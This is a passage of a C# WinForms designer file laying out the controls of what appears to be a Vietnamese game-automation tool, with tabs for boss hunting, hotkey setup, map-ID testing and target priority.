		this.label2.Size = new System.Drawing.Size(44, 15);
		this.label2.TabIndex = 187;
		this.label2.Text = "Tốc độ";
		this.checkBoxClickNPCSolan.AutoSize = true;
		this.checkBoxClickNPCSolan.Location = new System.Drawing.Point(250, 14);
		this.checkBoxClickNPCSolan.Name = "checkBoxClickNPCSolan";
		this.checkBoxClickNPCSolan.Size = new System.Drawing.Size(113, 19);
		this.checkBoxClickNPCSolan.TabIndex = 170;
		this.checkBoxClickNPCSolan.Text = "Số lần click Npc";
		this.checkBoxClickNPCSolan.UseVisualStyleBackColor = true;
		this.checkBoxClickNPCSolan.CheckedChanged += new System.EventHandler(checkBoxClickNPCSolan_CheckedChanged);
		this.tabPage8.Controls.Add(this.groupBox3);
		this.tabPage8.Location = new System.Drawing.Point(4, 24);
		this.tabPage8.Name = "tabPage8";
		this.tabPage8.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage8.Size = new System.Drawing.Size(382, 262);
		this.tabPage8.TabIndex = 4;
		this.tabPage8.Text = "Boss sát thủ";
		this.tabPage8.UseVisualStyleBackColor = true;
		this.groupBox3.Controls.Add(this.sanboss1cho);
		this.groupBox3.Controls.Add(this.label23);
		this.groupBox3.Controls.Add(this.buttonHuongdanCanhbos);
		this.groupBox3.Controls.Add(this.groupBox2);
		this.groupBox3.Controls.Add(this.checkBoxBossSTKhongLamHaucan);
		this.groupBox3.Controls.Add(this.checkBoxGhepSTG);
		this.groupBox3.Controls.Add(this.checkBoxBossSTtuhuy);
		this.groupBox3.Controls.Add(this.checkBoxONha);
		this.groupBox3.Controls.Add(this.comboBoxBosSatthu);
		this.groupBox3.Controls.Add(this.buttonGhepSTG);
		this.groupBox3.Controls.Add(this.checkBoxKhongLuuruong);
		this.groupBox3.Controls.Add(this.buttonSatthuAll);
		this.groupBox3.Controls.Add(this.checkBoxBossSatthu);
		this.groupBox3.Location = new System.Drawing.Point(0, 3);
		this.groupBox3.Name = "groupBox3";
		this.groupBox3.Size = new System.Drawing.Size(387, 260);
		this.groupBox3.TabIndex = 206;
		this.groupBox3.TabStop = false;
		this.groupBox3.Text = "Boss sát thủ";
		this.sanboss1cho.AutoSize = true;
		this.sanboss1cho.Location = new System.Drawing.Point(10, 50);
		this.sanboss1cho.Name = "sanboss1cho";
		this.sanboss1cho.Size = new System.Drawing.Size(81, 19);
		this.sanboss1cho.TabIndex = 272;
		this.sanboss1cho.Text = "Săn 1 chỗ";
		this.sanboss1cho.UseVisualStyleBackColor = true;
		this.sanboss1cho.CheckedChanged += new System.EventHandler(sanboss1cho_CheckedChanged);
		this.label23.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		this.label23.Location = new System.Drawing.Point(11, 164);
		this.label23.Name = "label23";
		this.label23.Size = new System.Drawing.Size(225, 30);
		this.label23.TabIndex = 207;
		this.label23.Text = "Lưu ý săn tổ đội thì auto chỉ chờ các ac PT trong cùng 1 máy";
		this.buttonHuongdanCanhbos.ForeColor = System.Drawing.Color.MediumBlue;
		this.buttonHuongdanCanhbos.Location = new System.Drawing.Point(13, 200);
		this.buttonHuongdanCanhbos.Name = "buttonHuongdanCanhbos";
		this.buttonHuongdanCanhbos.Size = new System.Drawing.Size(222, 56);
		this.buttonHuongdanCanhbos.TabIndex = 271;
		this.buttonHuongdanCanhbos.Text = "Phim Hướng dẫn";
		this.buttonHuongdanCanhbos.UseVisualStyleBackColor = true;
		this.buttonHuongdanCanhbos.Click += new System.EventHandler(buttonHuongdanCanhbos_Click);
		this.groupBox2.Controls.Add(this.comboBoxNoiBoss);
		this.groupBox2.Controls.Add(this.checkBoxTuChayBoss);
		this.groupBox2.Controls.Add(this.buttonDenDiemKetiep);
		this.groupBox2.Controls.Add(this.buttonBossAll);
		this.groupBox2.Controls.Add(this.buttonSuaXoa);
		this.groupBox2.Location = new System.Drawing.Point(238, 3);
		this.groupBox2.Name = "groupBox2";
		this.groupBox2.Size = new System.Drawing.Size(151, 264);
		this.groupBox2.TabIndex = 207;
		this.groupBox2.TabStop = false;
		this.groupBox2.Text = "Chạy boss hoàng kim";
		this.comboBoxNoiBoss.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxNoiBoss.DropDownWidth = 110;
		this.comboBoxNoiBoss.ForeColor = System.Drawing.Color.Black;
		this.comboBoxNoiBoss.FormattingEnabled = true;
		this.comboBoxNoiBoss.Location = new System.Drawing.Point(7, 40);
		this.comboBoxNoiBoss.Name = "comboBoxNoiBoss";
		this.comboBoxNoiBoss.Size = new System.Drawing.Size(132, 23);
		this.comboBoxNoiBoss.TabIndex = 166;
		this.comboBoxNoiBoss.SelectedIndexChanged += new System.EventHandler(comboBoxNoiBoss_SelectedIndexChanged);
		this.checkBoxTuChayBoss.AutoSize = true;
		this.checkBoxTuChayBoss.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxTuChayBoss.ForeColor = System.Drawing.Color.Blue;
		this.checkBoxTuChayBoss.Location = new System.Drawing.Point(9, 19);
		this.checkBoxTuChayBoss.Name = "checkBoxTuChayBoss";
		this.checkBoxTuChayBoss.Size = new System.Drawing.Size(130, 17);
		this.checkBoxTuChayBoss.TabIndex = 165;
		this.checkBoxTuChayBoss.Text = "Chọn maps chạy boss";
		this.checkBoxTuChayBoss.UseVisualStyleBackColor = true;
		this.checkBoxTuChayBoss.CheckedChanged += new System.EventHandler(checkBoxTuChayBoss_CheckedChanged);
		this.buttonDenDiemKetiep.ForeColor = System.Drawing.Color.Black;
		this.buttonDenDiemKetiep.Location = new System.Drawing.Point(6, 131);
		this.buttonDenDiemKetiep.Name = "buttonDenDiemKetiep";
		this.buttonDenDiemKetiep.Size = new System.Drawing.Size(134, 60);
		this.buttonDenDiemKetiep.TabIndex = 203;
		this.buttonDenDiemKetiep.Text = "Đến điểm kế tiếp";
		this.buttonDenDiemKetiep.UseVisualStyleBackColor = true;
		this.buttonDenDiemKetiep.Click += new System.EventHandler(buttonDenDiemKetiep_Click);
		this.buttonBossAll.ForeColor = System.Drawing.Color.Black;
		this.buttonBossAll.Location = new System.Drawing.Point(6, 65);
		this.buttonBossAll.Name = "buttonBossAll";
		this.buttonBossAll.Size = new System.Drawing.Size(134, 64);
		this.buttonBossAll.TabIndex = 168;
		this.buttonBossAll.Text = "Áp dụng cho tất cả ac";
		this.buttonBossAll.UseVisualStyleBackColor = true;
		this.buttonBossAll.Click += new System.EventHandler(buttonBossAll_Click);
		this.buttonSuaXoa.ForeColor = System.Drawing.Color.Black;
		this.buttonSuaXoa.Location = new System.Drawing.Point(6, 193);
		this.buttonSuaXoa.Name = "buttonSuaXoa";
		this.buttonSuaXoa.Size = new System.Drawing.Size(134, 60);
		this.buttonSuaXoa.TabIndex = 167;
		this.buttonSuaXoa.Text = "Chỉnh sửa tọa độ";
		this.buttonSuaXoa.UseVisualStyleBackColor = true;
		this.buttonSuaXoa.Click += new System.EventHandler(buttonSuaXoa_Click);
		this.checkBoxBossSTKhongLamHaucan.AutoSize = true;
		this.checkBoxBossSTKhongLamHaucan.ForeColor = System.Drawing.Color.Black;
		this.checkBoxBossSTKhongLamHaucan.Location = new System.Drawing.Point(116, 17);
		this.checkBoxBossSTKhongLamHaucan.Name = "checkBoxBossSTKhongLamHaucan";
		this.checkBoxBossSTKhongLamHaucan.Size = new System.Drawing.Size(123, 19);
		this.checkBoxBossSTKhongLamHaucan.TabIndex = 206;
		this.checkBoxBossSTKhongLamHaucan.Text = "Không mua thuốc";
		this.checkBoxBossSTKhongLamHaucan.UseVisualStyleBackColor = true;
		this.checkBoxBossSTKhongLamHaucan.CheckedChanged += new System.EventHandler(checkBoxBossSTKhongLamHaucan_CheckedChanged);
		this.checkBoxGhepSTG.AutoSize = true;
		this.checkBoxGhepSTG.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxGhepSTG.ForeColor = System.Drawing.Color.Red;
		this.checkBoxGhepSTG.Location = new System.Drawing.Point(116, 84);
		this.checkBoxGhepSTG.Name = "checkBoxGhepSTG";
		this.checkBoxGhepSTG.Size = new System.Drawing.Size(126, 17);
		this.checkBoxGhepSTG.TabIndex = 202;
		this.checkBoxGhepSTG.Text = "Tự ghép Sát thủ giản";
		this.checkBoxGhepSTG.UseVisualStyleBackColor = true;
		this.checkBoxGhepSTG.CheckedChanged += new System.EventHandler(checkBoxGhepSTG_CheckedChanged);
		this.checkBoxBossSTtuhuy.AutoSize = true;
		this.checkBoxBossSTtuhuy.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxBossSTtuhuy.ForeColor = System.Drawing.Color.Red;
		this.checkBoxBossSTtuhuy.Location = new System.Drawing.Point(116, 62);
		this.checkBoxBossSTtuhuy.Name = "checkBoxBossSTtuhuy";
		this.checkBoxBossSTtuhuy.Size = new System.Drawing.Size(123, 17);
		this.checkBoxBossSTtuhuy.TabIndex = 205;
		this.checkBoxBossSTtuhuy.Text = "Không bos thì tự hủy";
		this.checkBoxBossSTtuhuy.UseVisualStyleBackColor = true;
		this.checkBoxBossSTtuhuy.CheckedChanged += new System.EventHandler(checkBoxBossSTtuhuy_CheckedChanged);
		this.checkBoxONha.AutoSize = true;
		this.checkBoxONha.Location = new System.Drawing.Point(10, 67);
		this.checkBoxONha.Name = "checkBoxONha";
		this.checkBoxONha.Size = new System.Drawing.Size(59, 19);
		this.checkBoxONha.TabIndex = 200;
		this.checkBoxONha.Text = "Ở nhà";
		this.checkBoxONha.UseVisualStyleBackColor = true;
		this.checkBoxONha.CheckedChanged += new System.EventHandler(checkBoxONha_CheckedChanged);
		this.comboBoxBosSatthu.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxBosSatthu.DropDownWidth = 110;
		this.comboBoxBosSatthu.ForeColor = System.Drawing.Color.Black;
		this.comboBoxBosSatthu.FormattingEnabled = true;
		this.comboBoxBosSatthu.Location = new System.Drawing.Point(10, 23);
		this.comboBoxBosSatthu.Name = "comboBoxBosSatthu";
		this.comboBoxBosSatthu.Size = new System.Drawing.Size(100, 23);
		this.comboBoxBosSatthu.TabIndex = 165;
		this.comboBoxBosSatthu.SelectedIndexChanged += new System.EventHandler(comboBoxBosSatthu_SelectedIndexChanged);
		this.buttonGhepSTG.Location = new System.Drawing.Point(116, 106);
		this.buttonGhepSTG.Name = "buttonGhepSTG";
		this.buttonGhepSTG.Size = new System.Drawing.Size(120, 51);
		this.buttonGhepSTG.TabIndex = 204;
		this.buttonGhepSTG.Text = "Ghép sát thủ giản";
		this.buttonGhepSTG.UseVisualStyleBackColor = true;
		this.buttonGhepSTG.Click += new System.EventHandler(buttonGhepSTG_Click);
		this.checkBoxKhongLuuruong.AutoSize = true;
		this.checkBoxKhongLuuruong.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxKhongLuuruong.ForeColor = System.Drawing.Color.Red;
		this.checkBoxKhongLuuruong.Location = new System.Drawing.Point(116, 40);
		this.checkBoxKhongLuuruong.Name = "checkBoxKhongLuuruong";
		this.checkBoxKhongLuuruong.Size = new System.Drawing.Size(104, 17);
		this.checkBoxKhongLuuruong.TabIndex = 188;
		this.checkBoxKhongLuuruong.Text = "Không lưu rương";
		this.checkBoxKhongLuuruong.UseVisualStyleBackColor = true;
		this.checkBoxKhongLuuruong.CheckedChanged += new System.EventHandler(checkBoxKhongLuuruong_CheckedChanged);
		this.buttonSatthuAll.ForeColor = System.Drawing.Color.Red;
		this.buttonSatthuAll.Location = new System.Drawing.Point(10, 106);
		this.buttonSatthuAll.Name = "buttonSatthuAll";
		this.buttonSatthuAll.Size = new System.Drawing.Size(100, 51);
		this.buttonSatthuAll.TabIndex = 201;
		this.buttonSatthuAll.Text = "Áp dụng tất cả";
		this.buttonSatthuAll.UseVisualStyleBackColor = true;
		this.buttonSatthuAll.Click += new System.EventHandler(buttonSatthuAll_Click);
		this.checkBoxBossSatthu.AutoSize = true;
		this.checkBoxBossSatthu.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.checkBoxBossSatthu.Location = new System.Drawing.Point(10, 87);
		this.checkBoxBossSatthu.Name = "checkBoxBossSatthu";
		this.checkBoxBossSatthu.Size = new System.Drawing.Size(102, 17);
		this.checkBoxBossSatthu.TabIndex = 198;
		this.checkBoxBossSatthu.Text = "Bắt đầu chạy";
		this.checkBoxBossSatthu.UseVisualStyleBackColor = true;
		this.checkBoxBossSatthu.CheckedChanged += new System.EventHandler(checkBoxBossSatthu_CheckedChanged);
		this.tabPage10.Controls.Add(this.linkLabel3);
		this.tabPage10.Controls.Add(this.groupBox10);
		this.tabPage10.Controls.Add(this.label50);
		this.tabPage10.Controls.Add(this.label49);
		this.tabPage10.Controls.Add(this.groupBox9);
		this.tabPage10.Controls.Add(this.label48);
		this.tabPage10.Controls.Add(this.label47);
		this.tabPage10.Controls.Add(this.label46);
		this.tabPage10.Controls.Add(this.label45);
		this.tabPage10.Controls.Add(this.label44);
		this.tabPage10.Controls.Add(this.label43);
		this.tabPage10.Controls.Add(this.caidatlenh);
		this.tabPage10.Controls.Add(this.lenh6);
		this.tabPage10.Controls.Add(this.lenh5);
		this.tabPage10.Controls.Add(this.lenh4);
		this.tabPage10.Controls.Add(this.lenh3);
		this.tabPage10.Controls.Add(this.lenh2);
		this.tabPage10.Controls.Add(this.lenh1);
		this.tabPage10.Location = new System.Drawing.Point(4, 24);
		this.tabPage10.Name = "tabPage10";
		this.tabPage10.Size = new System.Drawing.Size(382, 262);
		this.tabPage10.TabIndex = 6;
		this.tabPage10.Text = "Cài Đặt Lệnh";
		this.tabPage10.UseVisualStyleBackColor = true;
		this.linkLabel3.AutoSize = true;
		this.linkLabel3.Location = new System.Drawing.Point(170, 111);
		this.linkLabel3.Name = "linkLabel3";
		this.linkLabel3.Size = new System.Drawing.Size(152, 15);
		this.linkLabel3.TabIndex = 17;
		this.linkLabel3.TabStop = true;
		this.linkLabel3.Text = "Video chi tiết cách sử dụng";
		this.linkLabel3.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabel3_LinkClicked);
		this.groupBox10.BackColor = System.Drawing.Color.WhiteSmoke;
		this.groupBox10.Controls.Add(this.label52);
		this.groupBox10.ForeColor = System.Drawing.Color.Red;
		this.groupBox10.Location = new System.Drawing.Point(150, 11);
		this.groupBox10.Name = "groupBox10";
		this.groupBox10.Size = new System.Drawing.Size(222, 96);
		this.groupBox10.TabIndex = 16;
		this.groupBox10.TabStop = false;
		this.groupBox10.Text = "Hướng Dẫn Cài Đặt Lệnh";
		this.label52.ForeColor = System.Drawing.Color.Black;
		this.label52.Location = new System.Drawing.Point(17, 22);
		this.label52.Name = "label52";
		this.label52.Size = new System.Drawing.Size(198, 70);
		this.label52.TabIndex = 0;
		this.label52.Text = "Trong ô nhập, 0 có nghĩa là ko cài, Còn lại ae muốn cài phím gì để sử dụng lệnh đó, thì cứ set vào sau đó chạy cài đặt là được";
		this.label50.AutoSize = true;
		this.label50.BackColor = System.Drawing.Color.DarkGray;
		this.label50.Location = new System.Drawing.Point(87, 4);
		this.label50.Name = "label50";
		this.label50.Size = new System.Drawing.Size(36, 15);
		this.label50.TabIndex = 15;
		this.label50.Text = "Phím";
		this.label49.AutoSize = true;
		this.label49.BackColor = System.Drawing.Color.Silver;
		this.label49.Location = new System.Drawing.Point(4, 5);
		this.label49.Name = "label49";
		this.label49.Size = new System.Drawing.Size(58, 15);
		this.label49.TabIndex = 14;
		this.label49.Text = "Thao Tác";
		this.groupBox9.BackColor = System.Drawing.Color.WhiteSmoke;
		this.groupBox9.Controls.Add(this.lenh7);
		this.groupBox9.Controls.Add(this.button2);
		this.groupBox9.Controls.Add(this.label51);
		this.groupBox9.ForeColor = System.Drawing.SystemColors.MenuHighlight;
		this.groupBox9.Location = new System.Drawing.Point(150, 135);
		this.groupBox9.Name = "groupBox9";
		this.groupBox9.Size = new System.Drawing.Size(223, 124);
		this.groupBox9.TabIndex = 13;
		this.groupBox9.TabStop = false;
		this.groupBox9.Text = "Dame Mặc Định";
		this.lenh7.Location = new System.Drawing.Point(14, 20);
		this.lenh7.Name = "lenh7";
		this.lenh7.Size = new System.Drawing.Size(52, 21);
		this.lenh7.TabIndex = 2;
		this.lenh7.Text = "q";
		this.lenh7.TextChanged += new System.EventHandler(lenh7_TextChanged);
		this.button2.Location = new System.Drawing.Point(6, 78);
		this.button2.Name = "button2";
		this.button2.Size = new System.Drawing.Size(211, 37);
		this.button2.TabIndex = 1;
		this.button2.Text = "Dame Mặc Định bằng SPACE";
		this.button2.UseVisualStyleBackColor = true;
		this.button2.Click += new System.EventHandler(button2_Click);
		this.label51.ForeColor = System.Drawing.SystemColors.InactiveCaptionText;
		this.label51.Location = new System.Drawing.Point(11, 42);
		this.label51.Name = "label51";
		this.label51.Size = new System.Drawing.Size(163, 35);
		this.label51.TabIndex = 0;
		this.label51.Text = "Đặt chiêu 9x = Q , sau đó chạy lệnh dưới đây";
		this.label48.AutoSize = true;
		this.label48.BackColor = System.Drawing.Color.WhiteSmoke;
		this.label48.Location = new System.Drawing.Point(12, 180);
		this.label48.Name = "label48";
		this.label48.Size = new System.Drawing.Size(72, 15);
		this.label48.TabIndex = 12;
		this.label48.Text = "Luyện Công";
		this.label47.AutoSize = true;
		this.label47.BackColor = System.Drawing.Color.WhiteSmoke;
		this.label47.Location = new System.Drawing.Point(13, 150);
		this.label47.Name = "label47";
		this.label47.Size = new System.Drawing.Size(21, 15);
		this.label47.TabIndex = 11;
		this.label47.Text = "F9";
		this.label46.AutoSize = true;
		this.label46.BackColor = System.Drawing.Color.WhiteSmoke;
		this.label46.Location = new System.Drawing.Point(13, 121);
		this.label46.Name = "label46";
		this.label46.Size = new System.Drawing.Size(44, 15);
		this.label46.TabIndex = 10;
		this.label46.Text = "Đồ Sát";
		this.label45.AutoSize = true;
		this.label45.BackColor = System.Drawing.Color.WhiteSmoke;
		this.label45.Location = new System.Drawing.Point(12, 92);
		this.label45.Name = "label45";
		this.label45.Size = new System.Drawing.Size(58, 15);
		this.label45.TabIndex = 9;
		this.label45.Text = "L/X Ngựa";
		this.label44.AutoSize = true;
		this.label44.BackColor = System.Drawing.Color.WhiteSmoke;
		this.label44.Location = new System.Drawing.Point(12, 63);
		this.label44.Name = "label44";
		this.label44.Size = new System.Drawing.Size(67, 15);
		this.label44.TabIndex = 8;
		this.label44.Text = "Ngồi Thiền";
		this.label43.AutoSize = true;
		this.label43.BackColor = System.Drawing.Color.WhiteSmoke;
		this.label43.Location = new System.Drawing.Point(15, 33);
		this.label43.Name = "label43";
		this.label43.Size = new System.Drawing.Size(36, 15);
		this.label43.TabIndex = 7;
		this.label43.Text = "Đi bộ";
		this.caidatlenh.BackColor = System.Drawing.Color.White;
		this.caidatlenh.ForeColor = System.Drawing.Color.Red;
		this.caidatlenh.Location = new System.Drawing.Point(7, 211);
		this.caidatlenh.Name = "caidatlenh";
		this.caidatlenh.Size = new System.Drawing.Size(124, 38);
		this.caidatlenh.TabIndex = 6;
		this.caidatlenh.Text = "Chạy Cài Đặt";
		this.caidatlenh.UseVisualStyleBackColor = false;
		this.caidatlenh.Click += new System.EventHandler(caidatlenh_Click);
		this.lenh6.Location = new System.Drawing.Point(86, 175);
		this.lenh6.Name = "lenh6";
		this.lenh6.Size = new System.Drawing.Size(46, 21);
		this.lenh6.TabIndex = 5;
		this.lenh6.Text = "0";
		this.lenh6.TextChanged += new System.EventHandler(lenh6_TextChanged);
		this.lenh5.Location = new System.Drawing.Point(86, 145);
		this.lenh5.Name = "lenh5";
		this.lenh5.Size = new System.Drawing.Size(46, 21);
		this.lenh5.TabIndex = 4;
		this.lenh5.Text = "0";
		this.lenh5.TextChanged += new System.EventHandler(lenh5_TextChanged);
		this.lenh4.Location = new System.Drawing.Point(86, 117);
		this.lenh4.Name = "lenh4";
		this.lenh4.Size = new System.Drawing.Size(45, 21);
		this.lenh4.TabIndex = 3;
		this.lenh4.Text = "0";
		this.lenh4.TextChanged += new System.EventHandler(lenh4_TextChanged);
		this.lenh3.Location = new System.Drawing.Point(86, 89);
		this.lenh3.Name = "lenh3";
		this.lenh3.Size = new System.Drawing.Size(45, 21);
		this.lenh3.TabIndex = 2;
		this.lenh3.Text = "0";
		this.lenh3.TextChanged += new System.EventHandler(lenh3_TextChanged);
		this.lenh2.Location = new System.Drawing.Point(86, 60);
		this.lenh2.Name = "lenh2";
		this.lenh2.Size = new System.Drawing.Size(45, 21);
		this.lenh2.TabIndex = 1;
		this.lenh2.Text = "0";
		this.lenh2.TextChanged += new System.EventHandler(lenh2_TextChanged);
		this.lenh1.Location = new System.Drawing.Point(86, 32);
		this.lenh1.Name = "lenh1";
		this.lenh1.Size = new System.Drawing.Size(45, 21);
		this.lenh1.TabIndex = 0;
		this.lenh1.Text = "0";
		this.lenh1.TextChanged += new System.EventHandler(lenh1_TextChanged);
		this.tabPageTest.Controls.Add(this.textBoxStart);
		this.tabPageTest.Controls.Add(this.label37);
		this.tabPageTest.Controls.Add(this.textBoxDelta);
		this.tabPageTest.Controls.Add(this.label36);
		this.tabPageTest.Controls.Add(this.textBoxMapId);
		this.tabPageTest.Controls.Add(this.label14);
		this.tabPageTest.Controls.Add(this.buttonOpenAllWeb);
		this.tabPageTest.Controls.Add(this.textBoxScrMouseXY);
		this.tabPageTest.Controls.Add(this.textBoxRealMouseXY);
		this.tabPageTest.Controls.Add(this.label13);
		this.tabPageTest.Controls.Add(this.textBoxScrPosXY);
		this.tabPageTest.Controls.Add(this.buttonTest);
		this.tabPageTest.Controls.Add(this.buttonFormTest);
		this.tabPageTest.Controls.Add(this.textBoxRealPosXY);
		this.tabPageTest.Location = new System.Drawing.Point(4, 24);
		this.tabPageTest.Name = "tabPageTest";
		this.tabPageTest.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageTest.Size = new System.Drawing.Size(382, 262);
		this.tabPageTest.TabIndex = 5;
		this.tabPageTest.Text = "Test ID Maps";
		this.tabPageTest.UseVisualStyleBackColor = true;
		this.textBoxStart.Location = new System.Drawing.Point(47, 91);
		this.textBoxStart.Name = "textBoxStart";
		this.textBoxStart.Size = new System.Drawing.Size(29, 21);
		this.textBoxStart.TabIndex = 181;
		this.textBoxStart.Text = "0";
		this.label37.AutoSize = true;
		this.label37.Location = new System.Drawing.Point(1, 94);
		this.label37.Name = "label37";
		this.label37.Size = new System.Drawing.Size(49, 15);
		this.label37.TabIndex = 180;
		this.label37.Text = "Start/++";
		this.textBoxDelta.Location = new System.Drawing.Point(78, 91);
		this.textBoxDelta.Name = "textBoxDelta";
		this.textBoxDelta.Size = new System.Drawing.Size(29, 21);
		this.textBoxDelta.TabIndex = 179;
		this.textBoxDelta.Text = "10";
		this.label36.AutoSize = true;
		this.label36.Location = new System.Drawing.Point(211, 9);
		this.label36.Name = "label36";
		this.label36.Size = new System.Drawing.Size(44, 15);
		this.label36.TabIndex = 178;
		this.label36.Text = "mapID";
		this.textBoxMapId.Location = new System.Drawing.Point(211, 26);
		this.textBoxMapId.Name = "textBoxMapId";
		this.textBoxMapId.Size = new System.Drawing.Size(38, 21);
		this.textBoxMapId.TabIndex = 177;
		this.label14.AutoSize = true;
		this.label14.Location = new System.Drawing.Point(1, 29);
		this.label14.Name = "label14";
		this.label14.Size = new System.Drawing.Size(47, 15);
		this.label14.TabIndex = 167;
		this.label14.Text = "mX,mY";
		this.buttonOpenAllWeb.Location = new System.Drawing.Point(2, 52);
		this.buttonOpenAllWeb.Name = "buttonOpenAllWeb";
		this.buttonOpenAllWeb.Size = new System.Drawing.Size(105, 36);
		this.buttonOpenAllWeb.TabIndex = 176;
		this.buttonOpenAllWeb.Text = "Mở tất cả trang web tab Cài game";
		this.buttonOpenAllWeb.UseVisualStyleBackColor = true;
		this.buttonOpenAllWeb.Click += new System.EventHandler(buttonOpenAllWeb_Click);
		this.textBoxScrMouseXY.Location = new System.Drawing.Point(144, 26);
		this.textBoxScrMouseXY.Name = "textBoxScrMouseXY";
		this.textBoxScrMouseXY.Size = new System.Drawing.Size(65, 21);
		this.textBoxScrMouseXY.TabIndex = 166;
		this.textBoxRealMouseXY.Location = new System.Drawing.Point(41, 26);
		this.textBoxRealMouseXY.Name = "textBoxRealMouseXY";
		this.textBoxRealMouseXY.Size = new System.Drawing.Size(101, 21);
		this.textBoxRealMouseXY.TabIndex = 165;
		this.label13.AutoSize = true;
		this.label13.Location = new System.Drawing.Point(1, 9);
		this.label13.Name = "label13";
		this.label13.Size = new System.Drawing.Size(39, 15);
		this.label13.TabIndex = 163;
		this.label13.Text = "pX,pY";
		this.textBoxScrPosXY.Location = new System.Drawing.Point(144, 6);
		this.textBoxScrPosXY.Name = "textBoxScrPosXY";
		this.textBoxScrPosXY.Size = new System.Drawing.Size(65, 21);
		this.textBoxScrPosXY.TabIndex = 164;
		this.buttonTest.ForeColor = System.Drawing.Color.Black;
		this.buttonTest.Location = new System.Drawing.Point(108, 52);
		this.buttonTest.Name = "buttonTest";
		this.buttonTest.Size = new System.Drawing.Size(70, 36);
		this.buttonTest.TabIndex = 160;
		this.buttonTest.Text = "Test";
		this.buttonTest.UseVisualStyleBackColor = true;
		this.buttonTest.Click += new System.EventHandler(buttonTest_Click);
		this.buttonFormTest.BackColor = System.Drawing.Color.DarkSeaGreen;
		this.buttonFormTest.ForeColor = System.Drawing.Color.Black;
		this.buttonFormTest.Location = new System.Drawing.Point(181, 52);
		this.buttonFormTest.Name = "buttonFormTest";
		this.buttonFormTest.Size = new System.Drawing.Size(70, 36);
		this.buttonFormTest.TabIndex = 161;
		this.buttonFormTest.Text = "Form";
		this.buttonFormTest.UseVisualStyleBackColor = false;
		this.buttonFormTest.Click += new System.EventHandler(buttonFormTest_Click);
		this.textBoxRealPosXY.Location = new System.Drawing.Point(41, 6);
		this.textBoxRealPosXY.Name = "textBoxRealPosXY";
		this.textBoxRealPosXY.Size = new System.Drawing.Size(101, 21);
		this.textBoxRealPosXY.TabIndex = 162;
		this.pkdon.BackColor = System.Drawing.Color.White;
		this.pkdon.Controls.Add(this.label41);
		this.pkdon.Controls.Add(this.textBox5);
		this.pkdon.Controls.Add(this.tocbien);
		this.pkdon.ForeColor = System.Drawing.Color.Black;
		this.pkdon.Location = new System.Drawing.Point(4, 30);
		this.pkdon.Name = "pkdon";
		this.pkdon.Size = new System.Drawing.Size(391, 290);
		this.pkdon.TabIndex = 6;
		this.pkdon.Text = "Tốc Biến";
		this.label41.AutoSize = true;
		this.label41.Location = new System.Drawing.Point(112, 3);
		this.label41.Name = "label41";
		this.label41.Size = new System.Drawing.Size(123, 15);
		this.label41.TabIndex = 2;
		this.label41.Text = "Hướng Dẫn sử dụng :";
		this.textBox5.Location = new System.Drawing.Point(111, 21);
		this.textBox5.Multiline = true;
		this.textBox5.Name = "textBox5";
		this.textBox5.ReadOnly = true;
		this.textBox5.Size = new System.Drawing.Size(283, 261);
		this.textBox5.TabIndex = 1;
		this.textBox5.Text = resources.GetString("textBox5.Text");
		this.tocbien.AutoSize = true;
		this.tocbien.ForeColor = System.Drawing.Color.Red;
		this.tocbien.Location = new System.Drawing.Point(7, 7);
		this.tocbien.Name = "tocbien";
		this.tocbien.Size = new System.Drawing.Size(98, 19);
		this.tocbien.TabIndex = 0;
		this.tocbien.Text = "Tốc biến TVB";
		this.tocbien.UseVisualStyleBackColor = true;
		this.tocbien.CheckedChanged += new System.EventHandler(tocbien_CheckedChanged);
		this.uutien.Controls.Add(this.linkLabel5);
		this.uutien.Controls.Add(this.label54);
		this.uutien.Controls.Add(this.checkBoxkepgoc);
		this.uutien.Controls.Add(this.buttonxoauutiennv);
		this.uutien.Controls.Add(this.listViewdanhtennv);
		this.uutien.Controls.Add(this.checkBoxkhoamuctieu);
		this.uutien.Controls.Add(this.checkBoxChayNhay);
		this.uutien.Controls.Add(this.comboBoxdanhtennv);
		this.uutien.Controls.Add(this.checkBoxdanhtennv);
		this.uutien.Controls.Add(this.buttonTuyChonMonPhai);
		this.uutien.Controls.Add(this.checkBox2);
		this.uutien.Location = new System.Drawing.Point(4, 30);
		this.uutien.Name = "uutien";
		this.uutien.Size = new System.Drawing.Size(391, 290);
		this.uutien.TabIndex = 7;
		this.uutien.Text = "Ưu Tiên";
		this.uutien.UseVisualStyleBackColor = true;
		this.linkLabel5.AutoSize = true;
		this.linkLabel5.Location = new System.Drawing.Point(31, 264);
		this.linkLabel5.Name = "linkLabel5";
		this.linkLabel5.Size = new System.Drawing.Size(78, 15);
		this.linkLabel5.TabIndex = 153;
		this.linkLabel5.TabStop = true;
		this.linkLabel5.Text = "Video Chi tiết";
		this.linkLabel5.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabel5_LinkClicked);
		this.label54.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		this.label54.Location = new System.Drawing.Point(8, 216);
		this.label54.Name = "label54";
		this.label54.Size = new System.Drawing.Size(140, 48);
		this.label54.TabIndex = 152;
		this.label54.Text = "Thêm tối đa 3 - 4 tên nhân vật, thêm nhiều dễ dis Auto nhé,";
		this.checkBoxkepgoc.AutoSize = true;
		this.checkBoxkepgoc.ForeColor = System.Drawing.SystemColors.Highlight;
		this.checkBoxkepgoc.Location = new System.Drawing.Point(8, 50);
		this.checkBoxkepgoc.Name = "checkBoxkepgoc";
		this.checkBoxkepgoc.Size = new System.Drawing.Size(104, 19);
		this.checkBoxkepgoc.TabIndex = 151;
		this.checkBoxkepgoc.Text = "Kẹp Góc đi Bộ";
		this.checkBoxkepgoc.UseVisualStyleBackColor = true;
		this.checkBoxkepgoc.CheckedChanged += new System.EventHandler(checkBoxkepgoc_CheckedChanged);
